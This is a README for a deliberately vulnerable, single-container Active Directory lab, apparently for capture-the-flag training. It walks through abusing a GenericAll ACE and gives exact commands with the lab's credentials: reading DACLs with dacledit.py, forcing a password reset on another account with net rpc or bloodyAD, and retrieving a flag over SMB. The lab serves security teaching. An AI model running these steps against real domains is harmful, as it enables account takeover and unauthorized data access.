# Active Directory ACL Abuse (GenericAll)

A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for **Vertex Media Group**, a
media and marketing agency, on the realm **VERTEX.LAB** — no Windows VMs. It provisions a
low-privilege foothold user (`d.laurent`, a content editor) that holds a dangerous **GenericAll**
ACE over a higher-value account (`b.whitfield`, the archivist), a bystander (`n.castellano`) with
no such control, and an `archive` share only `b.whitfield` may read.

| Machine | Service |
| --- | --- |
| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## The attack

1. From `d.laurent` / `Editor!2024`, read the DACL of candidate principals and find the ACE that
   grants `d.laurent` full control:
   `dacledit.py -action read -principal d.laurent -target-dn '<DN>' -dc-ip <dc> 'VERTEX/d.laurent:Editor!2024'`
   (a BloodHound `GenericAll` edge or `samba-tool dsacl get` show the same) → target `b.whitfield`.
2. Abuse GenericAll with a targeted **password reset** — full control includes the right to set
   a new password without the current one:
   `net rpc password b.whitfield 'NewPassw0rd!' -U 'VERTEX\d.laurent%Editor!2024' -S dc.vertex.lab`
   (or `bloodyAD ... set password b.whitfield 'NewPassw0rd!'` over LDAPS).
3. You now control `b.whitfield`.
4. Read the flag: `smbclient //dc/archive -U 'VERTEX\b.whitfield%NewPassw0rd!' -c 'get flag.txt'`.

## Run it

```bash
isoloom generate
isothrum up . --target docker
isothrum check . --target docker
isothrum down . --target docker
```

The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
This environment is deliberately vulnerable: keep it isolated.
